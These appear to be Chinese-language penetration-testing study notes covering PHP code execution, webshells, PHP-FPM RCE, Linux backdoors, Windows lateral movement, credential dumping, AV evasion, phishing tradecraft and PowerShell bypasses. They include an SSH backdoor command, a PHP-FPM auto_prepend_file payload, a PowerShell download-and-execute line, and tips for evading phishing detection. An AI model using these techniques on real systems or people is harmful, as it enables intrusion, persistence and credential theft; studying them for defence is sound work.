## 等级保护

云移物工大。

“一个中心，三重防护”：安全管理中心 + 安全通信网络，安全区域边界，安全计算环境。

技术部分：安全物理环境、安全通信网络、安全区域边界、安全计算环境、安全管理中心； 

管理部分：安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理。

## 密码学

对称性加密算法有：DES（Data Encryption Standard）、3DES（Triple DES）、Blowfish、RC4、RC5、RC6 和 AES（Advanced Encryption Standard）。优点：使用相同密钥带来的加解密的高速度。缺点：如果一个企业共用一个key，被泄露全玩完。

非对称性算法有：RSA、ECC （Elliptic Curves Cryptography 移动设备用）、DSA  （Digital Signature Algorithm 数字签名用）。双方交换公钥，使用时一方用对方的公钥加密，另一方即可用自己的私钥解密。缺点：加解密速度要远远慢于对称加密。

散列算法（签名算法）有：MD4（NTLM hash）、MD5（Message Digest Algorithm 5）、SHA（Secure Hash Algorithm）、SHA-1、HMAC、HMAC-MD5（NTLM v2 challenge加密）。单向算法。用途：主要用于验证，防止信息被修。具体用途如：文件校验、数字签名。

## php://input伪协议与POST请求有什么区别？

php://input 中是原始数据；$_POST 中是关联数组。

1、enctype=”multipart/form-data” 时：php://input 是无效的。

2、Content-Type = “text/plain”时：$_POST 不能获取post的数据， 但php://input可以。

## 利用smb或webdav文件包含

远程文件包含RFI，即使allow_url_fopen（默认on）和 allow_url_include（默认off）均为Off，即禁止包含http&ftp，也可以包含来自smb和webdav的数据。而这两种服务均使用UNC连接，所以Windows下各PHP版本均成功，Linux失败。

另，MySQL OOB 外带数据使用load_file(\\\\\\\\)，也是使用的UNC请求。

## eval和assert函数

eval把字符串作为PHP代码执行，是一个语言构造器而不是一个函数，不能被可变函数调用（即不可`$_POST['1']($_POST['2']);`）。

在PHP7.1之后assert变成了一种语言结构而不是一个函数，也和eval一样无法被可变函数调用。菜刀在实现文件管理器的时候用的是`assert`函数，这导致菜刀没办法在PHP7上正常运行。

assert 不能直接执行多语句。antsword蚁剑的default 编码器下发送的 Payload是多条PHP代码，所以一旦是 assert 的 shell，这种情况下只会执行第一行代码，而后面的代码就不会执行了。这也是众多新手在连接 assert 这种 shell 的时候一直提示“连接失败/返回空白”的原因。

## php中代码&命令执行涉及到的函数

eval()【传入的参数必须为PHP代码，即需要以分号结尾。】、assert()【传入的字符串当PHP代码来执行，不必须以分号结尾】、popen()、system()、exec()、shell_exec()、passthru()、pcntl_exec()等函数；

preg_replace('正则规则','替换字符'，'目标字符')等以正则表达式 /e 修饰；

creat_fuction()创建的匿名函数，call_user_func()、call_user_func_array()等回调函数，

反引号命令执行，花括号嵌套；

文件包含可能导致命令执行，include()、requeir()、xxx_once()；

##  JSP webshell

由于Java中没有所谓的eval函数，无法对直接传递的代码进行解析执行。所以不管是蚁剑还是菜刀对于JSP的shell一直是采用custom模式，即把要执行的代码提前写在shell中，然后每次只需要传递要调用的函数名以及对应的参数。

虽然可以实现相应的功能，但是带来一个问题就是shell体积非常巨大。菜刀的jsp脚本有7kb大小，蚁剑的jsp custom脚本即使去掉注释后还有17k之多，用起来非常的不方便。冰蝎的作者rebeyond师傅在文章 [利用动态二进制加密实现新型一句话木马之Java篇](https://xz.aliyun.com/t/2744) 中提出了一种新的jsp一句话的实现方式：**利用classloader直接解析编译后的class字节码，相当于实现了一个java的eval功能。**

##  DNS劫持和DNS污染（缓存投毒）

- **DNS劫持**：DNS Hijacking。指用户访问一个被标记的地址时，DNS服务器故意将此地址指向一个错误的IP地址的行为。网通、电信、铁通的某些用户有时候会发现自己打算访问一个地址，却被转向了各种推送广告等网站，这就是DNS劫持。你去解析一个不存在的域名的时候，DNS 本来应该告诉我们这个域名不存在，但是被劫持后 DNS 就会给我们解析出一个 IP。常见的情况就是电信 114 搜索。解决方法就是换成 Google DNS 就可以了解决了。
- **DNS污染**，又称为域名服务器缓存污染（DNS cache pollution）或者域名服务器缓存投毒（DNS cache poisoning）。用户访问一个地址，国内的服务器(非DNS)监控到用户访问的已经被标记地址时，服务器伪装成DNS服务器向用户发回错误的地址的行为。范例，访问Youtube、Facebook之类网站等出现的状况。你使用一个不存在的 IP （肯定不是 DNS ）作为 DNS 去解析某个域名的时候，理应没有任何返回，但是却能返回一个错误 IP。为了证明是污染不是劫持，你再用这个不存在的 IP 去解析不存在的域名，这个时候你会发现没有任何返回，这就说明这个不存在的域名没有被污染。解决方法就是 DNSCrypt 什么的了。

## Linux 后门

Ref：[1](https://github.com/ZYNCMA/blog/issues/1)

- 定时任务，计划任务，`/etc/crontab、/var/spool/cron/user等`。
- 设置服务，开启自启，`systemctl enable servername`。
- 文件隐藏，webshell，使用`.filename`命名，或`...`这种特殊字符命名，使用`touch -r normalfile webshell`修改时间戳。
- webshell，联合web服务器，.htaccess等。
- ssh公钥免密，添加UID=0的用户，易发现。
- 给自带程序设置SUID、SGID，查找拥有suid程序，`find / -perm +4000 -ls`。
- 利用系统服务程序，远程后门，修改`/etc/inetd.conf`，开启inetd，类似正向shell。
- PAM后门（Pluggable Authentication Modules, 嵌入式认证模块），配置在/etc/pam.d/，以服务名命名，提供了一连串的验证机制，日志在 /var/log/secure，编译成恶意so放在/lib64/security。
- 复写系统工具（命令），输入记录，ssh、openssl等，ln -s软连接，alias后门。
- rootkit套装，隐藏文件进程端口等，替换命令，清除日志，伪装校验和等。
- 共享库so文件，替换为恶意动态链接库，类似dll劫持。
- SSH后门，`ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oport=12345`，直接连，需要sshd开启了pam认证，需要复用su的pam配置。

## 碰到默认nginx页面的站点怎么办？

Nginx是一款反向代理软件，它的作用就是把请求按照你设定的规则进行转发到实际处理的服务器，支持正则匹配规则。

其整个结构就是实际处理的服务器前加一层7层代理（Nginx），根目录/就随便指向一个默认。入侵思路：1、扫描路径，用字典枚举。2、查ip、查端口、查子域名、查旁站、查C段。

## 早期nginx和iis7.5的解析漏洞

Fast-CGI其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道，数据格式类似字典，是一系列key-value对。

PHP-FPM（FastCGI进程管理器）其实是一个Fast-CGI协议解析器，Nginx等服务器中间件将用户请求按照Fast-CGI的规则打包好通过TCP传给FPM，FPM按照Fast-CGI的协议将TCP流解析，得到key-value，执行`SCRIPT_FILENAME`的值指向的PHP文件。

解析漏洞，当用户请求`http://127.0.0.1/favicon.ico/.php`，正常来说，`SCRIPT_FILENAME`的值是一个不存在的文件`/var/www/html/favicon.ico/.php`，**但由于php的默认配置+环境（ 在Fast-CGI模式）导致的，php.ini中cgi.fix_pathinfo默认为1，即php处理前修正url路径导致此漏洞**。在这个选项被打开的情况下，PHP-FPM会判断`SCRIPT_FILENAME`是否存在，如果不存在则去掉最后一个`/`及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在，然后按最初的文件格式执行，导致解析漏洞。

修复漏洞：一是在Nginx端使用`fastcgi_split_path_info`将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的`security.limit_extensions`配置项，避免其他后缀文件被解析。

## PHP-FPM未授权访问漏洞

PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造Fast-CGI协议，和PHP-FPM进行通信。

但PHP-FPM的`security.limit_extensions`配置项会限制只解析指定的后缀文件php。

由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用`find / -name "*.php"`来全局搜索一下默认环境。假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件。

RCE：php.ini有两个有意思的配置项，`auto_prepend_file`和`auto_append_file`，告诉PHP，在执行目标文件之前/后，先包含配置项中指定的文件。假设我们设置`auto_prepend_file`为`php://input`，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（需要开启远程文件包含allow_url_include）

但，这两个环境变量如何在不重启的情况下热加载？这又涉及到PHP-FPM的另外两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`，这两个环境变量就是用来设置PHP配置项的。

```
{
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    ...
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
}
```

## Web相关编码

```
https://baidu.com
URL编码：https%3A%2F%2Fbaidu.com
URl全编码：%68%74%74%70%73%3a%2f%2f%62%61%69%64%75%2e%63%6f%6d
Base64编码：aHR0cHM6Ly9iYWlkdS5jb20=
URL Safe Base64编码：aHR0cHM6Ly9iYWlkdS5jb20
Hex编码：68747470733a2f2f62616964752e636f6d
Html10编码：&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#98;&#97;&#105;&#100;&#117;&#46;&#99;&#111;&#109;
Html16编码：&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x62;&#x61;&#x69;&#x64;&#x75;&#x2e;&#x63;&#x6f;&#x6d;
JS8编码：\150\164\164\160\163\72\57\57\142\141\151\144\165\56\143\157\155
JS16编码：\x68\x74\x74\x70\x73\x3a\x2f\x2f\x62\x61\x69\x64\x75\x2e\x63\x6f\x6d
Unicode编码：\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u0061\u0069\u0064\u0075\u002e\u0063\u006f\u006d
```

## HTTP请求类型

常用HTTP请求：HEAD、GET、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT，出于安全考虑，需要禁用：

```
PUT：允许上传新文件至web服务器。攻击者可以上传恶意文件（比如可以执行调用cmd.exe命令的ASP/PHP文件）或者将受害者服务器用于存储自己的文件。
DELETE：允许删除web服务器上的文件。攻击者可以简单粗暴的丑化受害者网站或实施DDoS攻击。
CONNECT：允许客户端将服务器配置为代理。
TRACE：可以在客户端上回显任何发送到服务器上的字符串。这个请求本来是用于帮助开发者调试的。但这个看似人畜无害的请求，却被Jeremiah Grossman发现可以被利用以实施XST攻击。
```

## proxychains-ng 原理

简单的说就是这个程序 Hook 了 sockets 相关的操作，让普通程序的 sockets 数据走 SOCKS/HTTP 代理。**其核心就是利用了 LD_PRELOAD 这个环境变量（Mac 上是 DYLD_INSERT_LIBRARIES）**。在 Unix 系统中，如果设置了 LD_PRELOAD 环境变量，那么在程序运行时，动态链接器会先加载该环境变量所指定的动态库。也就是说，这个动态库的加载优先于任何其它的库，包括 libc。ProxyChains 创建了一个叫 libproxychains4.so（Mac 上是 libproxychains4.dylib）的动态库。里面重写了 connect、close 以及 sendto 等与 socket 相关的函数，通过这些函数发出的数据将会走代理，详细代码可以参考 libproxychains.c。在主程序里，它会读取配置文件，查找 libproxychains4 所在位置，把这些信息存入环境变量后执行子程序。这样子程序里对 socket 相关的函数调用就会被 Hook 了，对子程序来说，跟代理相关的东西都是透明的。可以用 printenv 来查看前后增加的环境变量。

proxychains后面接ping命令是不可以的，因为proxychains是在tcp层，ping命令是基于icmp在ip层。

由于proxychains无法代理icmp的数据包，所以代理使用nmap必须添加-Pn参数，即不检测主机是否存活，直接进行端口扫描。proxychains4 nmap -sT -Pn –open 192.168.100.1/22

## 远程登录windows server执行命令的方式

IPC\$+AT（445端口）、PSEXEC（445）、WMI（135）、WinRM（5985 HTTP &5986 HTTPS、在windows 2012才默认开启）

IPC，Inter-Process Communication，进程间通信：连接->copy上传->at定时器执行。

PsExec：通过ipc\$连接，然后释放psexesvc.exe到目标机器；通过服务管理SCManager远程创建psexecsvc服务，并启动服务；客户端连接执行命令，服务端启动相应的程序并执行回显数据。

WMI，Windows Management Instrumentation，整个运行过程都在计算机内存中发生，不会留下任何痕迹。WMI执行的命令是没有回显的，需要写入IPC\$或本地磁盘或注册表，或其它手法带出。

WinRM：Windows Remote Management

## hashdump和mimikatz

hashdump 是基于注册表只读取本地hash的；mimikatz基于lsass.exe内存读取缓存hash和明文，也可以从SAM文件读取。

另，Navicat 连接数据服务器的账号密码hash也存储在注册表中。

## Windows可执行程序免杀

**修改资源文件（Resource Hacker）、伪造数字签名（SigThief），可以临时免杀。**修改完资源文件后杀软已经不认识这个文件了，所以不杀，但是运行后会因为行为把文件hash加入到病毒库，所以每生成一次，也就只能临时用一下。

## Wireshark远程抓包

场景：远程Linux无桌面环境，需要抓包。

1、使用终端版termshark。

2、在远程linux下载rpcapd（wireshark远程抓包依赖），会开启服务并bind()，使用wireshark的remote interface添加rpcap://linuxip，即可获取到远程网卡。

## 钓鱼注意事项

1、**不直接将 payload 放置邮件内容**。指钓鱼URL，可以将 payload 放在自己的服务器、云oss等白站存储上，通过访问服务器的方式加载 payload，尽量重写URL一下，造成混淆，或使用白站域名跳转。

2、**不直接在邮件内容中添加恶意附件**。可以通过嵌入 html、js 等方式进行恶意文件加载。

3、**钓鱼域名使用过期域名**。网上可以查询刚过期的域名，去注册，来躲避安全产品的恶意标记。

4、搭建钓鱼网站尽量使用 https。

5、钓鱼内容尽量无趣。使用官话，不客套。

6、尽可能使用第三方的子域名。

7、每次使用的域名尽量不复用。

## 钓鱼攻击中文件的几种姿势

1、**内嵌链接**。在PDF、Office文档中内嵌一个跳转链接是很早期的钓鱼方式，通过文字信息的引导，让受害者点开页面。

2、**Office宏**。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。由于早些年宏病毒泛滥，现在Office的宏功能已经默认是禁用，但依然无法阻挡攻击者使用宏，那么如何引诱受害者开启宏功能就是关键了。

3、**CHM文档**。CHM是Windows帮助文件（如电子书）使用的扩展名，此文件可以被植入可执行代码。著名的Cobalt Strike就支持CHM钓鱼文件的生成。

4、漏洞利用。利用Office、Adobe、IE等应用软件的漏洞，精心制作成诱饵文档，是APT攻击中的常客。现实中可能不会及时更新打补丁，这种攻击方式的成功率是比较高的。这类文档除了挑选漏洞外，对文件命名也煞费苦心，通常会起最近的热点新闻，或跟自身相关的名字，让人看了不得不点开看看。

5、PPT手势触发。把ppt配置成ppsx后缀，双击运行后就是播放模式，鼠标只要划过指定区域就会执行一段代码，美中不足的是会被弹框警告，如果不警惕点了启用就中招了。

6、**LNK文件**。LNK（快捷方式或符号链接）是引用其他文件或程序的方法。

7、**文件后缀RTLO**。RTLO字符全名为“RIGHT-TO-LEFT OVERRIDE”，是一个不可显示的控制类字符，其本质是unicode 字符。可以将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如阿拉伯语，希伯来语。由于它可以重新排列字符的特性，会被攻击者利用从而达到欺骗目标，使得用户运行某些具有危害性的可执行文件。

8、**HTA文件**。HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件，本身就是html应用程序，双击就能运行，却比普通网页权限大得多，它具有桌面程序的所有权限。Cobalt Strike也支持HTA钓鱼文件的生成。

## 同站 (same-site) 请求 VS 跨站 (cross-site) 请求

一个 HTML 页面既可以发起同站请求，也可以发起跨站请求。当请求目标的 URL 对应的 site 与页面所在 URL 对应的 site 相同时，这个请求就是同站请求，反之就是跨站请求。

这里的site是指eTLD+1（effective top-level domain），即：有效顶级域名再加上它的下一级域名。是有机构专门维护，特殊的是有些个人或机构提供的私有域名如：github.io属于顶级域名。

所以就有了这样的例子：

```
当 www.baidu.com 的网页，请求 static.baidu.com 域下的图片，这个请求属于同站请求，site是指com+1 -> baidu.com。
当 a.github.io 的网页，请求 b.github.io 域下的图片，这个请求属于跨站请求，site是指github.io+1 -> a.github.io。
```

这里要注意和同源策略里的 same origin 做一下区分。同源指的是同协议、同域名、同端口。同站只看 site 是否一致，不管协议和端口。所以同源一定同站，同站不一定同源。

## 蜜罐

1、考虑蜜罐的部署区域，找到攻击者最可能“光顾”的区域，诱导攻击者对蜜罐发动攻击，从而分析攻击者的攻击路径。

2、蜜罐高度模拟真实资产，前期散布大量探针，诱导攻击者扫描攻击。

3、**将WAF与欺骗伪装平台进行联动**，将拦截页面重定向至蜜罐，采集攻击者信息。

4、分析收集到的数据，从IP、ipwhois、ip威胁情报、ip定位、ip反查域名、域名whois等，到公司、组织、法人等，再到具体人员社工信息，完整刻画攻击人画像。

5、实施反制措施，包括反向扫描攻击IP、**利用蜜罐服务定向鱼叉攻击入侵攻击者**。通过在VPN蜜罐、邮箱蜜罐中放置包含木马程序的文件或可执行程序，通过提示下载、包含敏感信息等模式诱导攻击者下载。

## PowerShell的bypass策略的方法

默认执行策略是Restricted，当一个用户启动一个ps1脚本，他将在记事本中打开，而不是执行。

1、Type  myscript.ps1  |  powershell.exe

2、Powershell.exe "iex(New-Object Net.WebClient).DownloadString('http://[REMOVED]/myscript.ps1')"

3、Powershell.exe –ExecutionPolicy bypass myscript.ps1

4、Powershell.exe -EncodedCommand base64编码的命令

除此之外。

-Nop/-NoProfile（忽略配置文件中的命令）

-W Hidden/-WindowStyle（隐藏命令窗口）

## bypass open_basedir

Ref：[1](https://zhzhdoai.github.io/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/)

1、chdir()、ini_set()函数组合

2、glob://绕过

3、命令执行绕过